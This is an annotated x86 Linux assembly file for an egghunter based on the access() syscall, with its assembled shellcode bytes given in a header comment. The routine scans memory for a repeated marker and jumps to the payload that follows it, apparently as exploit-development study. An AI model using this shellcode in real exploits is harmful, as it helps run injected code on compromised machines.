;   Skape's egghunter: access(2)
;   Shellcode generated: "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
;
global _start:

section .text

_start:
    mov ebx, 0x50905090     ; Store EGG in ebx
    xor ecx, ecx            ; Zero out ECX
    mul ecx                 ; Zero out EAX and EDX
IncPage:                    ; JMP to increment page number
    or dx, 0xfff            ; Align page address
IncAddr:                    ; JMP to increment address
    inc edx                 ; Go to next address
    pushad                  ; Push general registers onto stack
    lea ebx, [edx+4]        ; [edx+4] so we can compare [edx] and [edx+4] at the same time
    mov al, 0x21            ; syscall for access()
    int 0x80                ; call access() to check memory location [EBX]
    cmp al, 0xf2            ; Did it return EFAULT?
    popad                   ; Restore registers
    jz IncPage              ; access() returned EFAULT, skip page
    cmp [edx], ebx          ; initialized memory, check if EGG is in [edx]
    jnz IncAddr             ; EGG isn't in [edx], visit next address
    cmp [edx+4], ebx        ; EGG is found in [edx], is it in [edx+4] too?
    jne IncAddr             ; Boohoo! It wasn't. Visit next address
    jmp edx                 ; [edx][edx+4] contain EGGEGG, we found our shellcode! Execute meaningless EGGEGG instructions then our payload
